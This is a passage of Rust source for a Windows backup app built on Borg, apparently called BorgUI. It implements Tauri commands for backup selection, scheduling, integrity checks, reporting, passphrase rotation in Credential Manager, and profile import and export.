    pub attempts: Vec<DestinationAttemptResult>,
}

async fn record_destination_attempt(
    config_dir: &std::path::Path,
    run_id: &str,
    profile_id: &str,
    destination: &str,
    outcome: &str,
) {
    let _ = history::append_destination_attempt(
        config_dir,
        history::DestinationAttempt {
            run_id: run_id.into(),
            profile_id: profile_id.into(),
            destination: destination.into(),
            timestamp: chrono::Utc::now().to_rfc3339(),
            outcome: outcome.into(),
            error_message: (outcome == "failure")
                .then(|| "destination backup failed; details omitted".into()),
        },
    )
    .await;
}

#[tauri::command]
pub async fn discover_backup_sources() -> Result<Vec<crate::coverage::KnownFolder>, String> {
    tokio::task::spawn_blocking(crate::coverage::discover_known_folders)
        .await
        .map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn scan_backup_sources(
    state: State<'_, AppState>,
    source_paths: Vec<String>,
) -> Result<crate::coverage::CoverageScan, String> {
    borg_core::config::validate_source_paths(&source_paths).map_err(|e| e.to_string())?;
    let cancel =
        state.try_register_cancel(COVERAGE_SCAN_OP, "a coverage scan is already running")?;
    let scan_cancel = cancel.clone();
    let result = tokio::task::spawn_blocking(move || {
        crate::coverage::scan_sources(source_paths, &scan_cancel)
    })
    .await
    .map_err(|e| e.to_string());
    state.unregister_cancel(COVERAGE_SCAN_OP);
    result
}

#[tauri::command]
pub fn cancel_backup_source_scan(state: State<'_, AppState>) -> bool {
    state.signal_cancel(COVERAGE_SCAN_OP)
}

#[tauri::command]
pub async fn load_backup_selection(
    app: tauri::AppHandle,
) -> Result<profiles::BackupSelection, String> {
    let data = read_profiles(&app).await?;
    data.active()
        .map(|profile| profile.backup_selection.clone())
        .ok_or_else(|| "no active profile; configure repository first".to_string())
}

#[tauri::command]
pub async fn save_backup_selection(
    app: tauri::AppHandle,
    selection: profiles::BackupSelection,
    reviewed: bool,
) -> Result<(), String> {
    borg_core::config::validate_source_paths(&selection.source_paths).map_err(|e| e.to_string())?;
    borg_core::config::validate_exclude_patterns(&selection.excludes).map_err(|e| e.to_string())?;
    let scan = tokio::task::spawn_blocking({
        let paths = selection.source_paths.clone();
        move || crate::coverage::scan_sources(paths, &CancelToken::new())
    })
    .await
    .map_err(|e| e.to_string())?;
    if scan.needs_review && !reviewed {
        return Err(
            "coverage gaps or duplicate roots require explicit review before saving".into(),
        );
    }
    let mut data = read_profiles(&app).await?;
    data.active_mut()
        .ok_or_else(|| "no active profile; configure repository first".to_string())?
        .backup_selection = selection;
    write_profiles(&app, &data).await
}

#[tauri::command]
pub fn standard_backup_excludes() -> Vec<&'static str> {
    crate::coverage::STANDARD_EXCLUDES.to_vec()
}

#[tauri::command]
pub fn list_profile_templates() -> Vec<crate::templates::ResolvedTemplate> {
    crate::templates::list()
}

#[tauri::command]
pub async fn apply_profile_template(
    app: tauri::AppHandle,
    template_id: String,
    reviewed: bool,
) -> Result<profiles::BackupSelection, String> {
    if !reviewed {
        return Err("review the template sources and exclusions before applying".into());
    }
    let selection = crate::templates::apply(&template_id)?;
    borg_core::config::validate_source_paths(&selection.source_paths).map_err(|e| e.to_string())?;
    borg_core::config::validate_exclude_patterns(&selection.excludes).map_err(|e| e.to_string())?;
    let mut data = read_profiles(&app).await?;
    data.active_mut()
        .ok_or_else(|| "no active profile".to_string())?
        .backup_selection = selection.clone();
    write_profiles(&app, &data).await?;
    Ok(selection)
}

#[tauri::command]
pub async fn detach_profile_template(app: tauri::AppHandle) -> Result<(), String> {
    let mut data = read_profiles(&app).await?;
    let selection = &mut data
        .active_mut()
        .ok_or_else(|| "no active profile".to_string())?
        .backup_selection;
    selection.template_id = None;
    selection.template_version = None;
    write_profiles(&app, &data).await
}

#[tauri::command]
pub async fn load_resource_policy(
    app: tauri::AppHandle,
) -> Result<profiles::ResourcePolicy, String> {
    read_profiles(&app)
        .await?
        .active()
        .map(|profile| profile.resource_policy.clone())
        .ok_or_else(|| "no active profile".into())
}

#[tauri::command]
pub async fn load_placeholder_policy(
    app: tauri::AppHandle,
) -> Result<profiles::PlaceholderPolicy, String> {
    read_profiles(&app)
        .await?
        .active()
        .map(|profile| profile.placeholder_policy.clone())
        .ok_or_else(|| "no active profile".into())
}

#[tauri::command]
pub async fn save_placeholder_policy(
    app: tauri::AppHandle,
    policy: profiles::PlaceholderPolicy,
) -> Result<(), String> {
    if matches!(policy.mode, profiles::PlaceholderMode::Materialize)
        && policy.minimum_free_space_reserve == 0
    {
        return Err("materialization requires a non-zero free-space reserve".into());
    }
    let mut data = read_profiles(&app).await?;
    data.active_mut()
        .ok_or_else(|| "no active profile".to_string())?
        .placeholder_policy = policy;
    write_profiles(&app, &data).await
}

#[tauri::command]
pub async fn save_resource_policy(
    app: tauri::AppHandle,
    policy: profiles::ResourcePolicy,
    autostart_consent: bool,
) -> Result<(), String> {
    if policy.upload_limit_kib == Some(0) {
        return Err("upload limit must be greater than zero or left unlimited".into());
    }
    if policy
        .allowed_wifi_names
        .iter()
        .any(|name| name.trim().is_empty())
    {
        return Err("allowed Wi-Fi names cannot be empty".into());
    }
    if policy.removable_destination_trigger
        && !borg_platform_win::autostart::is_enabled(borg_platform_win::autostart::AUTOSTART_VALUE)
            .await
    {
        if !autostart_consent {
            return Err(
                "removable destination triggers require consent to start BorgUI at login".into(),
            );
        }
        let exe = std::env::current_exe().map_err(|error| error.to_string())?;
        borg_platform_win::autostart::enable(
            borg_platform_win::autostart::AUTOSTART_VALUE,
            &exe.to_string_lossy(),
        )
        .await
        .map_err(|error| error.to_string())?;
    }
    let mut data = read_profiles(&app).await?;
    let profile = data
        .active_mut()
        .ok_or_else(|| "no active profile".to_string())?;
    profile.resource_policy = policy.clone();
    let schedule = profile.schedule.clone();
    write_profiles(&app, &data).await?;
    if let Some(schedule) = schedule.filter(|schedule| schedule.enabled) {
        let exe = std::env::current_exe().map_err(|error| error.to_string())?;
        borg_platform_win::scheduler::schedule_backup(
            "BorgUI-Backup",
            &exe.to_string_lossy(),
            "--scheduled-backup",
            &schedule.schedule,
            policy.wake_for_backup,
        )
        .await
        .map_err(|error| error.to_string())?;
    }
    Ok(())
}

#[tauri::command]
pub async fn set_global_snooze(
    app: tauri::AppHandle,
    choice: String,
) -> Result<crate::snooze::SnoozeState, String> {
    crate::snooze::save(&config_dir(&app).await?, &choice).await
}

#[tauri::command]
pub async fn get_global_snooze(
    app: tauri::AppHandle,
) -> Result<Option<crate::snooze::SnoozeState>, String> {
    crate::snooze::load(&config_dir(&app).await?).await
}

#[derive(Debug, Serialize)]
pub struct ReportingSecretStatus {
    pub webhook_configured: bool,
    pub smtp_password_configured: bool,
}

#[tauri::command]
pub async fn reporting_secret_status(
    app: tauri::AppHandle,
) -> Result<ReportingSecretStatus, String> {
    let data = read_profiles(&app).await?;
    let id = &data
        .active()
        .ok_or_else(|| "no active profile".to_string())?
        .id;
    Ok(ReportingSecretStatus {
        webhook_configured: keychain::has_passphrase(&crate::reporting::webhook_account(id))?,
        smtp_password_configured: keychain::has_passphrase(&crate::reporting::smtp_account(id))?,
    })
}

#[tauri::command]
pub async fn save_reporting_settings(
    app: tauri::AppHandle,
    settings: profiles::ReportPreferences,
    webhook_url: Option<String>,
    smtp_password: Option<String>,
) -> Result<(), String> {
    let mut data = read_profiles(&app).await?;
    let profile = data
        .active_mut()
        .ok_or_else(|| "no active profile".to_string())?;
    profile.reporting = settings.clone();
    crate::reporting::validate_preferences(profile)?;
    if let Some(url) = webhook_url {
        if url.is_empty() {
            keychain::clear_passphrase(&crate::reporting::webhook_account(&profile.id))?;
        } else if !url.starts_with("https://") || url.contains(['\r', '\n', '\0']) {
            return Err("webhook URL must be a valid HTTPS URL".into());
        } else {
            keychain::set_passphrase(&crate::reporting::webhook_account(&profile.id), &url)?;
        }
    }
    if let Some(password) = smtp_password {
        if password.is_empty() {
            keychain::clear_passphrase(&crate::reporting::smtp_account(&profile.id))?;
        } else {
            keychain::set_passphrase(&crate::reporting::smtp_account(&profile.id), &password)?;
        }
    }
    if settings.webhook_enabled
        && !keychain::has_passphrase(&crate::reporting::webhook_account(&profile.id))?
    {
        return Err("configure the HTTPS webhook URL before enabling webhooks".into());
    }
    if settings.smtp_enabled
        && !keychain::has_passphrase(&crate::reporting::smtp_account(&profile.id))?
    {
        return Err("configure the SMTP password before enabling email".into());
    }
    let profile_id = profile.id.clone();
    write_profiles(&app, &data).await?;
    const TASK: &str = "BorgUI-Daily-Health-Report";
    if settings.enabled && settings.daily_digest {
        let exe = std::env::current_exe().map_err(|error| error.to_string())?;
        borg_platform_win::scheduler::schedule_backup(
            TASK,
            &exe.to_string_lossy(),
            "--scheduled-health-report",
            &borg_platform_win::scheduler::Schedule::Daily { hour: 9, minute: 0 },
            false,
        )
        .await
        .map_err(|error| error.to_string())?;
    } else {
        let _ = borg_platform_win::scheduler::unschedule_backup(TASK).await;
    }
    tracing::debug!(profile_id, "reporting settings updated");
    Ok(())
}

#[tauri::command]
pub async fn send_test_report(app: tauri::AppHandle) -> Result<(), String> {
    let data = read_profiles(&app).await?;
    let profile = data
        .active()
        .cloned()
        .ok_or_else(|| "no active profile".to_string())?;
    if !profile.reporting.enabled {
        return Err("enable outbound reporting before sending a test".into());
    }
    crate::reporting::validate_preferences(&profile)?;
    let dir = config_dir(&app).await?;
    crate::reporting::deliver(
        &dir,
        &profile,
        "digest",
        "green",
        "BorgUI test report delivered successfully.",
        None,
        1,
        None,
    )
    .await
}

/// Cancel a running backup. Returns true if a backup was in progress.
#[tauri::command]
pub async fn cancel_backup(state: State<'_, AppState>) -> Result<bool, String> {
    Ok(state.signal_cancel(BACKUP_OP))
}

/// Cancel a running restore. Returns true if a restore was in progress.
#[tauri::command]
pub async fn cancel_restore(state: State<'_, AppState>) -> Result<bool, String> {
    Ok(state.signal_cancel(RESTORE_OP))
}

#[tauri::command]
pub async fn check_repository(
    app: tauri::AppHandle,
    state: State<'_, AppState>,
    verify_data: bool,
) -> Result<IntegrityEvent, String> {
    let data = read_profiles(&app).await?;
    let profile = data
        .active()
        .cloned()
        .ok_or_else(|| "no active profile; configure repository first".to_string())?;
    precheck_repo(&profile.repo).await?;

    let mode = if verify_data {
        CheckMode::VerifyData
    } else {
        CheckMode::Repository
    };
    let started = std::time::Instant::now();
    let cancel = state.try_register_cancel(CHECK_OP, "an integrity check is already running")?;
    let pass = lookup_passphrase(&profile.repo);
    let progress_app = app.clone();
    let result = state
        .borg
        .check(
            &profile.repo,
            mode,
            pass.as_deref(),
            &cancel,
            move |event| {
                let _ = progress_app.emit("integrity-check-progress", &event);
            },
        )
        .await;
    state.unregister_cancel(CHECK_OP);

    let cancelled = matches!(result, Err(borg_core::error::BorgError::Cancelled));
    let warnings = result
        .as_ref()
        .ok()
        .map(|outcome| outcome.warnings.clone())
        .unwrap_or_default();
    let error_message = result
        .as_ref()
        .err()
        .map(|error| error.detail())
        .or_else(|| (!warnings.is_empty()).then(|| warnings.join("\n")));
    let event = IntegrityEvent {
        id: chrono::Utc::now().timestamp_millis().to_string(),
        timestamp: chrono::Utc::now().to_rfc3339(),
        profile_id: profile.id.clone(),
        mode: if verify_data {
            "verify_data".into()
        } else {
            "repository".into()
        },
        outcome: if result.is_ok() && warnings.is_empty() {
            "success".into()
        } else if cancelled {
            "cancelled".into()
        } else {
            "failure".into()
        },
        duration_seconds: started.elapsed().as_secs(),
        error_message,
    };
    let dir = config_dir(&app).await?;
    history::append_integrity(&dir, event.clone()).await?;
    result.map_err(|error| error.detail())?;
    Ok(event)
}

#[tauri::command]
pub async fn cancel_repository_check(state: State<'_, AppState>) -> Result<bool, String> {
    Ok(state.signal_cancel(CHECK_OP))
}

#[tauri::command]
pub async fn latest_integrity_check(
    app: tauri::AppHandle,
) -> Result<Option<IntegrityEvent>, String> {
    let data = read_profiles(&app).await?;
    let Some(profile) = data.active() else {
        return Ok(None);
    };
    let dir = config_dir(&app).await?;
    history::latest_integrity(&dir, &profile.id).await
}

#[tauri::command]
pub async fn set_monthly_integrity_check(
    app: tauri::AppHandle,
    enabled: bool,
) -> Result<(), String> {
    const TASK: &str = "BorgUI-Integrity-Check";
    if enabled {
        let exe = std::env::current_exe().map_err(|e| e.to_string())?;
        borg_platform_win::scheduler::schedule_monthly_check(
            TASK,
            &exe.to_string_lossy(),
            "--scheduled-integrity-check",
        )
        .await
        .map_err(|e| e.to_string())?;
    } else {
        borg_platform_win::scheduler::unschedule_backup(TASK)
            .await
            .map_err(|e| e.to_string())?;
    }

    let mut data = read_profiles(&app).await?;
    let profile = data
        .active_mut()
        .ok_or_else(|| "no active profile; configure repository first".to_string())?;
    profile.integrity_schedule = Some(crate::profiles::IntegritySchedule { enabled });
    write_profiles(&app, &data).await
}

#[tauri::command]
pub async fn set_monthly_restore_drill(app: tauri::AppHandle, enabled: bool) -> Result<(), String> {
    const TASK: &str = "BorgUI-Monthly-Restore-Drill";
    if enabled {
        let exe = std::env::current_exe().map_err(|e| e.to_string())?;
        borg_platform_win::scheduler::schedule_monthly_check(
            TASK,
            &exe.to_string_lossy(),
            "--scheduled-restore-drill",
        )
        .await
        .map_err(|e| e.to_string())?;
    } else {
        borg_platform_win::scheduler::unschedule_backup(TASK)
            .await
            .map_err(|e| e.to_string())?;
    }
    let mut data = read_profiles(&app).await?;
    data.active_mut()
        .ok_or_else(|| "no active profile; configure repository first".to_string())?
        .restore_drill_schedule = Some(crate::profiles::RestoreDrillSchedule { enabled });
    write_profiles(&app, &data).await
}

#[tauri::command]
pub async fn latest_restore_drill(
    app: tauri::AppHandle,
) -> Result<Option<history::RestoreDrillEvent>, String> {
    let data = read_profiles(&app).await?;
    let profile_id = data
        .active()
        .ok_or_else(|| "no active profile".to_string())?
        .id
        .clone();
    history::latest_restore_drill(&config_dir(&app).await?, &profile_id).await
}

#[derive(Debug, Serialize)]
pub struct RestoreResult {
    pub warnings: Vec<String>,
    pub destination: String,
}

#[tauri::command]
pub async fn restore_archive(
    app: tauri::AppHandle,
    state: State<'_, AppState>,
    repo: RepoConfig,
    archive_name: String,
    destination: String,
    paths: Option<Vec<String>>,
    overwrite: bool,
) -> Result<RestoreResult, String> {
    precheck_repo(&repo).await?;
    borg_core::config::validate_archive_name(&archive_name).map_err(|e| e.to_string())?;

    let destination_root = PathBuf::from(&destination);
    if !destination_root.is_dir() {
        return Err(format!("destination does not exist: {}", destination));
    }
    let dest_path = if overwrite {
        destination_root
    } else {
        let timestamp = chrono::Local::now().format("%Y-%m-%d %H%M%S");
        let path = destination_root.join(format!("BorgUI Restore {timestamp}"));
        tokio::fs::create_dir(&path)
            .await
            .map_err(|e| format!("cannot create restore folder: {e}"))?;
        path
    };

    let paths = paths.unwrap_or_default();
    for p in &paths {
        borg_core::archive::validate_restore_path(p)?;
    }

    let pass = lookup_passphrase(&repo);
    let cancel = state.try_register_cancel(RESTORE_OP, "a restore is already running")?;
    let result = state
        .borg
        .extract(
            &repo,
            &archive_name,
            &dest_path,
            &paths,
            pass.as_deref(),
            &cancel,
            move |event| {
                let _ = app.emit("restore-progress", &event);
            },
        )
        .await;
    state.unregister_cancel(RESTORE_OP);

    result
        .map(|outcome| RestoreResult {
            warnings: outcome.warnings,
            destination: dest_path.to_string_lossy().into_owned(),
        })
        .map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn load_schedule_config(
    app: tauri::AppHandle,
) -> Result<Option<borg_platform_win::scheduler::ScheduleConfig>, String> {
    let data = read_profiles(&app).await?;
    Ok(data.active().and_then(|p| p.schedule.clone()))
}

#[tauri::command]
pub async fn save_schedule_config(
    app: tauri::AppHandle,
    config: borg_platform_win::scheduler::ScheduleConfig,
) -> Result<(), String> {
    config.schedule.validate().map_err(|e| e.to_string())?;
    let mut data = read_profiles(&app).await?;
    let profile = data
        .active_mut()
        .ok_or_else(|| "no active profile; configure repository first".to_string())?;
    profile.schedule = Some(config.clone());
    let wake_to_run = profile.resource_policy.wake_for_backup;
    write_profiles(&app, &data).await?;

    if config.enabled {
        let exe = std::env::current_exe().map_err(|e| e.to_string())?;
        let exe_str = exe.to_string_lossy().to_string();
        let args = "--scheduled-backup";
        borg_platform_win::scheduler::schedule_backup(
            "BorgUI-Backup",
            &exe_str,
            args,
            &config.schedule,
            wake_to_run,
        )
        .await
        .map_err(|e| e.to_string())?;
    } else {
        let _ = borg_platform_win::scheduler::unschedule_backup("BorgUI-Backup").await;
    }

    Ok(())
}

#[derive(Debug, Serialize)]
pub struct ScheduledBackupStatus {
    pub last_attempt: Option<crate::history::ScheduledAttempt>,
    pub missed: bool,
    pub grace_seconds: u64,
    pub task_registered: bool,
}

#[tauri::command]
pub async fn scheduled_backup_status(
    app: tauri::AppHandle,
) -> Result<ScheduledBackupStatus, String> {
    let data = read_profiles(&app).await?;
    let Some(profile) = data.active() else {
        return Ok(ScheduledBackupStatus {
            last_attempt: None,
            missed: false,
            grace_seconds: 0,
            task_registered: false,
        });
    };
    let schedule = profile
        .schedule
        .as_ref()
        .filter(|schedule| schedule.enabled);
    let grace_seconds = match schedule.map(|schedule| &schedule.schedule) {
        Some(borg_platform_win::scheduler::Schedule::Hourly) => 90 * 60,
        Some(borg_platform_win::scheduler::Schedule::Daily { .. }) => 36 * 60 * 60,
        None => 0,
    };
    let dir = config_dir(&app).await?;
    let last_attempt = history::latest_scheduled_attempt(&dir, &profile.id).await?;
    let missed = last_attempt.as_ref().is_some_and(|attempt| {
        crate::scheduled::is_missed(&attempt.timestamp, grace_seconds, chrono::Utc::now())
    });
    let task_registered = if schedule.is_some() {
        borg_platform_win::scheduler::task_exists("BorgUI-Backup")
            .await
            .unwrap_or(false)
    } else {
        false
    };
    Ok(ScheduledBackupStatus {
        last_attempt,
        missed,
        grace_seconds,
        task_registered,
    })
}

/// Whether BorgUI is registered to start at login (reads the Windows `Run` key).
#[tauri::command]
pub async fn get_autostart() -> Result<bool, String> {
    Ok(
        borg_platform_win::autostart::is_enabled(borg_platform_win::autostart::AUTOSTART_VALUE)
            .await,
    )
}

/// Register or unregister BorgUI to start (minimized to the tray) at login.
#[tauri::command]
pub async fn set_autostart(enabled: bool) -> Result<(), String> {
    let value = borg_platform_win::autostart::AUTOSTART_VALUE;
    if enabled {
        let exe = std::env::current_exe().map_err(|e| e.to_string())?;
        let exe_str = exe.to_string_lossy().to_string();
        borg_platform_win::autostart::enable(value, &exe_str)
            .await
            .map_err(|e| e.to_string())
    } else {
        borg_platform_win::autostart::disable(value)
            .await
            .map_err(|e| e.to_string())
    }
}

#[tauri::command]
pub async fn set_repo_passphrase(repo: RepoConfig, passphrase: String) -> Result<(), String> {
    repo.validate().map_err(|e| e.to_string())?;
    if passphrase.is_empty() {
        return Err("passphrase cannot be empty".into());
    }
    keychain::set_passphrase(&repo.ssh_url(), &passphrase)
}

/// Emitted when `borg key change-passphrase` succeeded but the Credential
/// Manager write did not. Reporting that as an ordinary failure would tell the
/// user the opposite of what happened: the repository now opens *only* with the
/// new passphrase while the stored copy is stale. Kept byte-identical to
/// `PASSPHRASE_ROTATED_UNSAVED_PREFIX` in
/// `app-tauri/src/lib/passphrase-save.ts`, which detects this prefix and shows
/// the message verbatim instead of prefixing it with "Failed to change".
const PASSPHRASE_ROTATED_UNSAVED_PREFIX: &str =
    "The repository passphrase was changed, but the stored copy could not be updated";

/// Emitted when the rotation timed out. `run_checked` drops the future without
/// killing borg — deliberately, since killing it mid-key-write risks corrupting
/// the key and losing every archive — so the child may still commit the change
/// after we stop waiting. The outcome is genuinely unknown, and reporting it as
/// a plain failure would tell the user nothing happened when it may well have.
/// Mirrored by `PASSPHRASE_ROTATION_INDETERMINATE_PREFIX` in
/// `app-tauri/src/lib/passphrase-save.ts`.
const PASSPHRASE_ROTATION_INDETERMINATE_PREFIX: &str =
    "The passphrase change timed out, so it may or may not have been applied";

/// Never include the passphrase itself — only how to recover.
fn rotated_unsaved_error(cause: &str) -> String {
    format!(
        "{PASSPHRASE_ROTATED_UNSAVED_PREFIX} ({cause}). The repository now requires the NEW \
         passphrase: re-open this dialog, tick \"Only update the stored copy\", and enter the \
         new passphrase, or backups and restores will fail to unlock it."
    )
}

/// Never include the passphrase itself — only how to recover.
fn rotation_indeterminate_error(cause: &str) -> String {
    format!(
        "{PASSPHRASE_ROTATION_INDETERMINATE_PREFIX} ({cause}). The stored copy was NOT updated. \
         Check which passphrase opens the repository before backing up again: if the NEW one \
         works, re-open this dialog, tick \"Only update the stored copy\", and enter it."
    )
}

/// Rotate the repository's REAL passphrase (borg key change-passphrase) using
/// the currently stored one, then update Credential Manager. This is the
/// change-flow counterpart to `set_repo_passphrase`, which only overwrites the
/// stored copy and would otherwise silently desync it from the repository.
#[tauri::command]
pub async fn change_repo_passphrase(
    app: tauri::AppHandle,
    state: State<'_, AppState>,
    repo: RepoConfig,
    new_passphrase: String,
) -> Result<(), String> {
    precheck_repo(&repo).await?;
    if new_passphrase.is_empty() {
        return Err("passphrase cannot be empty".into());
    }
    // Deliberately not `lookup_passphrase`, which collapses a keychain *error*
    // into "nothing stored". That distinction matters here: on a real read
    // failure (Credential Manager is unavailable outside an interactive logon,
    // for instance) the "use Set passphrase" advice would steer the user into
    // the keychain-only write, desyncing a repository whose stored passphrase
    // was in fact fine.
    let old = match keychain::get_passphrase(&repo.ssh_url()) {
        Ok(Some(stored)) => stored,
        Ok(None) => {
            return Err(
                "no stored passphrase to rotate — use Set passphrase to store the repository's existing passphrase first"
                    .into(),
            );
        }
        Err(e) => return Err(format!("could not read the stored passphrase: {e}")),
    };
    state
        .borg
        .change_passphrase(&repo, &old, &new_passphrase)
        .await
        .map_err(|e| match e {
            BorgError::Timeout { .. } => rotation_indeterminate_error(&e.to_string()),
            other => other.to_string(),
        })?;
    // Only after the repository accepted the rotation — keeping the stored
    // copy in lockstep with the repo is the entire point of this command. If
    // this write fails the two are now out of sync in the most dangerous
    // direction, so say so explicitly rather than reporting a plain failure.
    keychain::set_passphrase(&repo.ssh_url(), &new_passphrase)
        .map_err(|e| rotated_unsaved_error(&e))?;
    // Any recovery key exported before now still carries the OLD passphrase,
    // so recovery readiness must stop counting it. Recorded after the keychain
    // write so a rotation only invalidates the export once the whole flow has
    // actually succeeded. A failure to record must not fail the rotation — the
    // passphrase really did change — so it degrades to a warning.
    if let Err(e) = record_passphrase_rotation(&app, &repo).await {
        tracing::warn!("could not record passphrase rotation for recovery readiness: {e}");
    }
    Ok(())
}

/// Record a `passphrase_rotation` readiness event against whichever profile
/// points at this repository. The passphrase dialog runs against the live repo
/// form, which need not be the active profile, so match on the repo rather than
/// assuming.
async fn record_passphrase_rotation(
    app: &tauri::AppHandle,
    repo: &RepoConfig,
) -> Result<(), String> {
    let data = read_profiles(app).await?;
    let url = repo.ssh_url();
    let Some(profile) = data.profiles.iter().find(|p| p.repo.ssh_url() == url) else {
        // A repo configured in the form but not yet saved as a profile has no
        // readiness to invalidate.
        return Ok(());
    };
    let dir = config_dir(app).await?;
    history::append_readiness_event(
        &dir,
        history::ReadinessEvent {
            timestamp: chrono::Utc::now().to_rfc3339(),
            profile_id: profile.id.clone(),
            kind: "passphrase_rotation".into(),
            outcome: "success".into(),
        },
    )
    .await
}

#[tauri::command]
pub async fn clear_repo_passphrase(repo: RepoConfig) -> Result<(), String> {
    repo.validate().map_err(|e| e.to_string())?;
    keychain::clear_passphrase(&repo.ssh_url())
}

#[tauri::command]
pub async fn has_repo_passphrase(repo: RepoConfig) -> Result<bool, String> {
    repo.validate().map_err(|e| e.to_string())?;
    keychain::has_passphrase(&repo.ssh_url())
}

#[tauri::command]
pub async fn record_backup_event(app: tauri::AppHandle, event: BackupEvent) -> Result<(), String> {
    let dir = config_dir(&app).await?;
    history::append(&dir, event).await
}

#[tauri::command]
pub async fn load_backup_history(app: tauri::AppHandle) -> Result<Vec<BackupEvent>, String> {
    let dir = config_dir(&app).await?;
    history::load(&dir).await
}

#[tauri::command]
pub async fn clear_backup_history(app: tauri::AppHandle) -> Result<(), String> {
    let dir = config_dir(&app).await?;
    history::clear(&dir).await
}

#[tauri::command]
pub async fn load_repo_config(app: tauri::AppHandle) -> Result<Option<RepoConfig>, String> {
    let data = read_profiles(&app).await?;
    Ok(data.active().map(|p| p.repo.clone()))
}

#[tauri::command]
pub async fn save_repo_config(app: tauri::AppHandle, repo: RepoConfig) -> Result<(), String> {
    repo.validate().map_err(|e| e.to_string())?;
    let mut data = read_profiles(&app).await?;
    if let Some(profile) = data.active_mut() {
        profile.repo = repo;
    } else {
        let profile = Profile {
            id: "default".into(),
            name: "Default".into(),
            repo,
            secondary_repo: None,
            backup_selection: Default::default(),
            schedule: None,
            integrity_schedule: None,
            restore_drill_schedule: None,
            resource_policy: Default::default(),
            hardening: Default::default(),
            reporting: Default::default(),
            placeholder_policy: Default::default(),
            storage_warnings: Default::default(),
            recovery: Default::default(),
            retention: None,
            archive_template: None,
            pre_backup: None,
            post_backup: None,
        };
        data.active_id = Some(profile.id.clone());
        data.profiles.push(profile);
    }
    write_profiles(&app, &data).await
}

#[tauri::command]
pub async fn save_secondary_repository(
    app: tauri::AppHandle,
    repo: Option<RepoConfig>,
    passphrase: Option<String>,
) -> Result<(), String> {
    let mut data = read_profiles(&app).await?;
    let profile = data
        .active_mut()
        .ok_or_else(|| "no active profile".to_string())?;
    if let Some(repo) = &repo {
        repo.validate().map_err(|error| error.to_string())?;
        if repo.location() == profile.repo.location() {
            return Err("secondary repository must differ from primary".into());
        }
        if let Some(passphrase) = passphrase.as_deref().filter(|value| !value.is_empty()) {
            keychain::set_passphrase(&repo.ssh_url(), passphrase)?;
        }
    } else if let Some(previous) = &profile.secondary_repo {
        keychain::clear_passphrase(&previous.ssh_url())?;
    }
    profile.secondary_repo = repo;
    write_profiles(&app, &data).await
}

#[tauri::command]
pub async fn list_profiles(app: tauri::AppHandle) -> Result<ProfilesData, String> {
    read_profiles(&app).await
}

#[tauri::command]
pub async fn set_active_profile(app: tauri::AppHandle, id: String) -> Result<(), String> {
    let mut data = read_profiles(&app).await?;
    data.set_active(&id)?;
    write_profiles(&app, &data).await
}

#[tauri::command]
pub async fn create_profile(
    app: tauri::AppHandle,
    name: String,
    repo: RepoConfig,
) -> Result<Profile, String> {
    repo.validate().map_err(|e| e.to_string())?;
    let name = name.trim().to_string();
    if name.is_empty() {
        return Err("profile name cannot be empty".into());
    }

    let mut data = read_profiles(&app).await?;
    let id = profiles::make_profile_id(&name, &data);
    let profile = Profile {
        id: id.clone(),
        name,
        repo,
        secondary_repo: None,
        backup_selection: Default::default(),
        schedule: None,
        integrity_schedule: None,
        restore_drill_schedule: None,
        resource_policy: Default::default(),
        hardening: Default::default(),
        reporting: Default::default(),
        placeholder_policy: Default::default(),
        storage_warnings: Default::default(),
        recovery: Default::default(),
        retention: None,
        archive_template: None,
        pre_backup: None,
        post_backup: None,
    };
    data.profiles.push(profile.clone());
    if data.active_id.is_none() {
        data.active_id = Some(id);
    }
    write_profiles(&app, &data).await?;
    Ok(profile)
}

#[tauri::command]
pub async fn rename_profile(app: tauri::AppHandle, id: String, name: String) -> Result<(), String> {
    let name = name.trim().to_string();
    if name.is_empty() {
        return Err("profile name cannot be empty".into());
    }
    let mut data = read_profiles(&app).await?;
    let profile = data
        .profiles
        .iter_mut()
        .find(|p| p.id == id)
        .ok_or_else(|| format!("profile not found: {}", id))?;
    profile.name = name;
    write_profiles(&app, &data).await
}

#[tauri::command]
pub async fn export_profile(app: tauri::AppHandle, id: String, path: String) -> Result<(), String> {
    let data = read_profiles(&app).await?;
    let profile = data
        .profiles
        .iter()
        .find(|p| p.id == id)
        .ok_or_else(|| format!("profile not found: {}", id))?;
    let json = serde_json::to_string_pretty(profile).map_err(|e| e.to_string())?;
    tokio::fs::write(&path, json)
        .await
        .map_err(|e| e.to_string())
}

/// Parse and validate a profile export. Every field is validated (not just the
/// repo), and imported pre/post-backup hooks are DISARMED: hooks run arbitrary
/// shell commands, so a hook embedded in an imported file must never execute
/// until the user re-enters it deliberately via the hooks settings.
fn parse_imported_profile(json: &str) -> Result<Profile, String> {
    let mut imported: Profile =
        serde_json::from_str(json).map_err(|e| format!("invalid profile JSON: {}", e))?;
    imported.pre_backup = None;
    imported.post_backup = None;
    let name = imported.name.trim().to_string();
    if name.is_empty() {
        return Err("imported profile has empty name".into());
    }
    imported.name = name;
    imported.validate()?;
    Ok(imported)
}

#[tauri::command]
pub async fn import_profile(app: tauri::AppHandle, path: String) -> Result<Profile, String> {
    let json = tokio::fs::read_to_string(&path)
        .await
        .map_err(|e| e.to_string())?;
    let mut imported = parse_imported_profile(&json)?;

    let mut data = read_profiles(&app).await?;
    imported.id = profiles::make_profile_id(&imported.name, &data);
    data.profiles.push(imported.clone());
    if data.active_id.is_none() {
        data.active_id = Some(imported.id.clone());
    }
    write_profiles(&app, &data).await?;
    Ok(imported)
}

#[tauri::command]
pub async fn set_profile_template(
    app: tauri::AppHandle,
    id: String,
    template: Option<String>,
) -> Result<(), String> {
    let template = template.and_then(|t| {
        let trimmed = t.trim().to_string();
        if trimmed.is_empty() {
            None
        } else {
            Some(trimmed)
        }
    });
    let mut data = read_profiles(&app).await?;
    let profile = data
        .profiles
        .iter_mut()
        .find(|p| p.id == id)
        .ok_or_else(|| format!("profile not found: {}", id))?;
    profile.archive_template = template;
    write_profiles(&app, &data).await
}

#[tauri::command]
pub async fn set_profile_hooks(
    app: tauri::AppHandle,
    id: String,
    pre_backup: Option<String>,
    post_backup: Option<String>,
) -> Result<(), String> {
    let clean = |v: Option<String>| {
        v.and_then(|s| {
            let t = s.trim().to_string();
            if t.is_empty() { None } else { Some(t) }
        })
    };
    let mut data = read_profiles(&app).await?;
    let profile = data
        .profiles
        .iter_mut()
        .find(|p| p.id == id)
        .ok_or_else(|| format!("profile not found: {}", id))?;
    profile.pre_backup = clean(pre_backup);
    profile.post_backup = clean(post_backup);
    write_profiles(&app, &data).await
}

